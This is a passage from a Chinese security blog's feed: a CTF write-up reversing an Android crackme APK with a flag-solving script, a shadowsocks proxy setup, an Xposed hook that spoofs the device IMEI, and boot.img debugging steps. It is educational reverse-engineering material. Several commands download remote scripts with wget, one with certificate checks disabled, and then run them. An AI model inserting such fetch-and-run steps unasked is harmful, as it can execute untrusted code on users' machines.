          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android逆向基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>福建海峡两岸CTF 2015:一个APK，逆向试试吧</title>
      <link href="/2018/02/07/mobicrackNDK/"/>
      <url>/2018/02/07/mobicrackNDK/</url>
      <content type="html"><![CDATA[<h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><p>JNI_Onload 中通过 RegisterNatives 动态注册 jni 函数<br>.init_array</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><a href="http://eternalsakura13.com/2018/02/08/jni2/">http://eternalsakura13.com/2018/02/08/jni2/</a><br><a href="http://eternalsakura13.com/2018/02/08/jnienv/">http://eternalsakura13.com/2018/02/08/jnienv/</a></p><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/mobicrackNDK.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/mobicrackNDK.apk</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看一下apk是什么样的。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa3sg083lj30ui0pqafd.jpg" alt=""><br>用jadx反编译，然后导出android工程，用as打开<br>查看AndroidManifest.xml<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foa3opf5wyj31kw0mrjxj.jpg" alt=""><br>在java代码中定位<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa3tr1sg0j316e184dop.jpg" alt=""><br>可以看出，调用了一个native方法testFlag，将输入的flag字符串传入testFlag进行验证，验证成功则弹出输入的字符串，否则就wrong answer。<br>用IDA打开so文件查看。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa3yorrawj30x80a2goo.jpg" alt=""><br>发现没有testFlag对应的c函数，怀疑是动态注册<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foa3zvvj7wj30kw1e8go4.jpg" alt=""><br>找到JNI_Onload()<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1foa4r4w73ej31kw0w3n8a.jpg" alt=""><br>用y把参数都改改<br>首先,JNI_Onload()的参数是JavaVM *vm<br>再看GetEnv，它的第一个参数是JavaVM,然后第二个参数就是用来存得到的env指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JNIInvokeInterface</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"> jint (*GetEnv)(JavaVM*, <span class="keyword">void</span>**, jint);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">JavaVM</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNIInvokeInterface</span>* <span class="title">functions</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    ...</span><br><span class="line"> <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="keyword">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;GetEnv(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foa50ueretj31bo06gmym.jpg" alt=""><br>所以我们把v7修改为env。<br>v2=env,所以v2也是<code>JNIEnv *</code>类型。<br>再看v4，v4是FindClass的返回值,类型是jclass<br><code>jclass (*FindClass)(JNIEnv*, const char*);</code><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foa576k6dxj31go0e878u.jpg" alt=""><br>这样修改后我们的反编译代码就好看多了，这种技巧非常有用，除非你已经很熟练了，否则这样多改改最好。(改类型按y，改名字按n)<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa5e7e2nkj31kw0ttgu5.jpg" alt=""><br>这样我们就找到了函数映射表。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa5glaz6yj31c60b4gps.jpg" alt=""><br>很显然abcdefghijklmn就是testFlag的native实现，双击切过去重命名为Java_com_testFlag。<br>具体的验证算法就在这里。</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>像刚刚那样修正一下参数类型。<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foa6avmsj0j31e21ayto9.jpg" alt=""></p><h3 id="前8位校验"><a href="#前8位校验" class="headerlink" title="前8位校验"></a>前8位校验</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1foa6bc72wjj318o0bon08.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">s2[i] = input[i] - i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将s2和seed比较，seed的内容是<img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa6cnh3zij30dw01qweh.jpg" alt=""></p><h3 id="后8位校验"><a href="#后8位校验" class="headerlink" title="后8位校验"></a>后8位校验</h3><p>首先调用了java层的calcKey方法，计算得到一个key<br>Calc.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.mobicrackndk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">calcKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        key = <span class="keyword">new</span> StringBuffer(<span class="string">"c7^WVHZ,"</span>).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后将后八位处理一下，存入字符串<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">8</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">s3[i - <span class="number">8</span>] = input[i] - i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1foa6i25zw1j31fq0ncqas.jpg" alt=""></p><p>于是写出脚本计算flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">seed=<span class="string">'QflMn`fH'</span></span><br><span class="line">key=<span class="string">'c7^WVHZ,'</span>[::<span class="number">-1</span>]</span><br><span class="line">cyphertext=seed+key</span><br><span class="line">plaintext=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    plaintext.append(chr(ord(cyphertext[i])+i))</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(c <span class="keyword">for</span> c <span class="keyword">in</span> plaintext)</span><br></pre></td></tr></table></figure></p><p>算出QgnPrelO4cRackEr，然而wrong answer.</p><h2 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h2><p>在JNI_Onload之前执行的只能是<code>.init_array</code>段了。</p><h3 id="init-array"><a href="#init-array" class="headerlink" title=".init_array"></a>.init_array</h3><p>根据 linker 源码, section 的执行顺序为 .preinit_array -&gt; .init -&gt; .init_array 。但 so 是不会执行 .preinit_array 的, 可以忽略。</p><p>.init_array 是一个函数指针数组。编写代码时在函数声明时加上 <code>__attribute__((constructor))</code> 使之成为共享构造函数，即可使该函数出现在 .init_array section 中。</p><p>IDA 动态调试时 ‘ctrl+s’ 查看 section 信息即可定位这两个 setction，特别的，对于 .init_array，可通过搜索 <code>Calling %s @ %p for &#39;%s&#39;</code> 定位。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1foa7pcpgbpj316i0kmjzb.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1foa7zei3nuj30yk09g0vj.jpg" alt=""><br>进入<code>__init_my</code>看看<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa7zztvb9j30oi0k8tca.jpg" alt=""><br>确实在这里对seed字符串进行了修改。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">t[i] = seed[i] - <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">seed = t</span><br></pre></td></tr></table></figure></p><p>所以最终我们的reverse脚本是<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seed = <span class="string">'QflMn`fH'</span></span><br><span class="line">seed = <span class="string">""</span>.join(chr(ord(c) - <span class="number">3</span>) <span class="keyword">for</span> c <span class="keyword">in</span> seed)</span><br><span class="line">key = <span class="string">'c7^WVHZ,'</span>[::<span class="number">-1</span>]</span><br><span class="line">cyphertext = seed + key</span><br><span class="line">plaintext = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    plaintext.append(chr(ord(cyphertext[i]) + i))</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(c <span class="keyword">for</span> c <span class="keyword">in</span> plaintext)</span><br></pre></td></tr></table></figure></p><p>flag是NdkMobiL4cRackEr<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1foa8f823vbj31kw0whtch.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zybuluo.com/cxm-2016/note/566623" target="_blank" rel="noopener">https://www.zybuluo.com/cxm-2016/note/566623</a><br><a href="https://github.com/toToCW/CTF-Mobile/blob/master/2015海峡两岸CTF/一个APK，逆向试试吧ndk/WriteUp/2015海峡两岸CTF-一个APK，逆向试试吧.md" target="_blank" rel="noopener">https://github.com/toToCW/CTF-Mobile/blob/master/2015海峡两岸CTF/一个APK，逆向试试吧ndk/WriteUp/2015海峡两岸CTF-一个APK，逆向试试吧.md</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> android reverse </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>shadowsocks配置和优化</title>
      <link href="/2018/02/06/ss/"/>
      <url>/2018/02/06/ss/</url>
      <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://teddysun.com/486.html" target="_blank" rel="noopener">https://teddysun.com/486.html</a></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</span><br><span class="line">chmod +x shadowsocks-all.sh</span><br><span class="line">./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</span><br></pre></td></tr></table></figure><h2 id="脚本使用参考我的截图"><a href="#脚本使用参考我的截图" class="headerlink" title="脚本使用参考我的截图"></a>脚本使用参考我的截图</h2><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo6w9tna4lj31kw0uzniz.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo6waxwx7dj30x20d844c.jpg" alt=""></p><p>选shadowsocks-python<br>服务器端口最好设置为443<br>加密方式选aes-256-cfb</p><h2 id="配置文件位置和使用"><a href="#配置文件位置和使用" class="headerlink" title="配置文件位置和使用"></a>配置文件位置和使用</h2><p>/etc/shadowsocks-python/config.json</p><p>/etc/init.d/shadowsocks-python start | stop | restart | status</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>针对OVZ</p><h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://sometimesnaive.org/article/linux/bash/tcp_nanqinlang-rinetd#检查-rinetd-bbr-运行状态" target="_blank" rel="noopener">https://sometimesnaive.org/article/linux/bash/tcp_nanqinlang-rinetd#检查-rinetd-bbr-运行状态</a></p><h3 id="shell-1"><a href="#shell-1" class="headerlink" title="shell"></a>shell</h3><p>centos7 64位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/nanqinlang-tcp/tcp_nanqinlang/releases/download/rinetd/tcp_nanqinlang-rinetd-centos.sh</span><br><span class="line">bash tcp_nanqinlang-rinetd-centos.sh</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Xposed hook系统方法实践</title>
      <link href="/2018/02/05/xposed1/"/>
      <url>/2018/02/05/xposed1/</url>
      <content type="html"><![CDATA[<p><a href="http://eternalsakura13.com/2018/02/04/hook2/">项目构建</a>和<a href="http://eternalsakura13.com/2018/01/19/nexus51/">xposed下载</a>参考我之前的文章。</p><h2 id="Hook类的名称进行内部查找方法（findAndHookMethod"><a href="#Hook类的名称进行内部查找方法（findAndHookMethod" class="headerlink" title="Hook类的名称进行内部查找方法（findAndHookMethod)"></a>Hook类的名称进行内部查找方法（findAndHookMethod)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hook_method</span><span class="params">(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XposedHelpers.findAndHookMethod(className, classLoader, methodName, parameterTypesAndCallback);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            XposedBridge.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="反射找到具体方法"><a href="#反射找到具体方法" class="headerlink" title="反射找到具体方法"></a>反射找到具体方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hook_method2</span><span class="params">(String className, String methodName, XC_MethodHook xmh)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line">            <span class="keyword">for</span> (Method method : clazz.getDeclaredMethods()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(methodName)</span><br><span class="line">                        &amp;&amp; !Modifier.isAbstract(method.getModifiers())</span><br><span class="line">                        &amp;&amp; Modifier.isPublic(method.getModifiers())) &#123;</span><br><span class="line">                    XposedBridge.hookMethod(method, xmh);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            XposedBridge.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="案例测试"><a href="#案例测试" class="headerlink" title="案例测试"></a>案例测试</h2><h3 id="新建一个class，实现xposed"><a href="#新建一个class，实现xposed" class="headerlink" title="新建一个class，实现xposed"></a>新建一个class，实现xposed</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposeddemo;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by sakura on 2018/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="comment">//第一个参数是Hook的类的名称，第二个参数是类的classloader，第三个参数是Hook的具体方法，第四个参数是Hook之后的回调，一般有before和after</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hook_method</span><span class="params">(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XposedHelpers.findAndHookMethod(className, classLoader, methodName, parameterTypesAndCallback);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            XposedBridge.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hook_method2</span><span class="params">(String className, String methodName, XC_MethodHook xmh)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line">            <span class="keyword">for</span> (Method method : clazz.getDeclaredMethods()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(methodName)</span><br><span class="line">                        &amp;&amp; !Modifier.isAbstract(method.getModifiers())</span><br><span class="line">                        &amp;&amp; Modifier.isPublic(method.getModifiers())) &#123;</span><br><span class="line">                    XposedBridge.hookMethod(method, xmh);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            XposedBridge.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpp)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Log.i(<span class="string">"sakura"</span>, <span class="string">"pkg:"</span> + lpp.packageName);</span><br><span class="line">        hook_method2(<span class="string">"android.telephony.TelephonyManager"</span>, <span class="string">"getDeviceId"</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Log.i(<span class="string">"sakura"</span>, <span class="string">"hook getDeviceId..."</span>);</span><br><span class="line">                Object obj = param.getResult();</span><br><span class="line">                Log.i(<span class="string">"sakura"</span>, <span class="string">"imei args:"</span> + obj);</span><br><span class="line">                param.setResult(<span class="string">"sakura"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainActivity.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposeddemo;</span><br><span class="line"><span class="keyword">import</span> android.Manifest;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.app.ActivityCompat;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.telephony.TelephonyManager;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TextView imeiTxt;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        imeiTxt = (TextView) findViewById(R.id.imei);</span><br><span class="line">        TelephonyManager telephonyManager = (TelephonyManager) <span class="keyword">this</span>.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">        <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(<span class="keyword">this</span>, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Consider calling</span></span><br><span class="line">            <span class="comment">// ActivityCompat#requestPermissions</span></span><br><span class="line">            <span class="comment">// here to request the missing permissions, and then overriding</span></span><br><span class="line">            <span class="comment">// public void onRequestPermissionsResult(int requestCode, String[] permissions,</span></span><br><span class="line">            <span class="comment">// int[] grantResults)</span></span><br><span class="line">            <span class="comment">// to handle the case where the user grants the permission. See the documentation</span></span><br><span class="line">            <span class="comment">// for ActivityCompat#requestPermissions for more details.</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String imei = telephonyManager.getDeviceId();</span><br><span class="line">        imeiTxt.setText(<span class="string">"imei:"</span> + imei);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo5zk72n4uj30u01eon0j.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo5zmy36l6j30uy1gejv4.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xposed </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>修改Nexus5的boot.img - 打开系统调试</title>
      <link href="/2018/02/04/trick2/"/>
      <url>/2018/02/04/trick2/</url>
      <content type="html"><![CDATA[<h2 id="使用须知"><a href="#使用须知" class="headerlink" title="使用须知"></a>使用须知</h2><h3 id="工具备注："><a href="#工具备注：" class="headerlink" title="工具备注："></a>工具备注：</h3><p>mkbootimg和unpackbootimg可能只能用在linux x86的系统上，那我的linux x64怎么能使用这两个工具，需要下载支持x86程序运行的库。<br>你可以参考这些命令去下载运行库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get -y upgrade</span><br><span class="line">sudo apt-get -y install binutils nasm</span><br><span class="line">sudo apt-get -y install gcc-multilib g++-multilib</span><br><span class="line">sudo apt-get -y install libc6-dev-i386</span><br></pre></td></tr></table></figure></p><h3 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h3><p>linux上使用，mac和windows均不可以。<br>在ubuntu14.04 64位测试通过。</p><h3 id="boot-img"><a href="#boot-img" class="headerlink" title="boot.img"></a>boot.img</h3><p>我编译好了两个版本的，Nexus5手机，<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/boot/newboot4.4.4.img" target="_blank" rel="noopener">android4.4.4</a>和<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/boot/newboot5.0.1.img" target="_blank" rel="noopener">android5.0.1</a>。<br>实体机测试通过，需要自取。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载<a href="https://github.com/eternalsakura/ctf_pwn/tree/master/boot" target="_blank" rel="noopener">工具包</a>和<a href="https://developers.google.com/android/images" target="_blank" rel="noopener">android源码(根据自己的android版本)</a></p><h2 id="解压源码，找到boot-img"><a href="#解压源码，找到boot-img" class="headerlink" title="解压源码，找到boot.img"></a>解压源码，找到boot.img</h2><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo4r56t97zj30kw04y3zu.jpg" alt=""></p><h2 id="将工具包的路径加入环境变量"><a href="#将工具包的路径加入环境变量" class="headerlink" title="将工具包的路径加入环境变量"></a>将工具包的路径加入环境变量</h2><p><code>export PATH=/home/sakura/工具:$PATH</code><br>将上面的/home/sakura/工具替换成你自己的工具包路径。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4r8oul5kj30mq03xgmn.jpg" alt=""><br>这样工具包里的程序就可以使用了。</p><h2 id="boot-img解包"><a href="#boot-img解包" class="headerlink" title="boot.img解包"></a>boot.img解包</h2><p><code>split-bootimg.pl boot.img</code><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo4rahvjmuj30wt078gns.jpg" alt=""></p><h2 id="处理boot-img-ramdisk-gz"><a href="#处理boot-img-ramdisk-gz" class="headerlink" title="处理boot.img-ramdisk.gz"></a>处理boot.img-ramdisk.gz</h2><p>运行下面的命令，对boot.img-ramdisk.gz进行解压：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ramdisk</span><br><span class="line">cd ramdisk</span><br><span class="line">gzip -dc 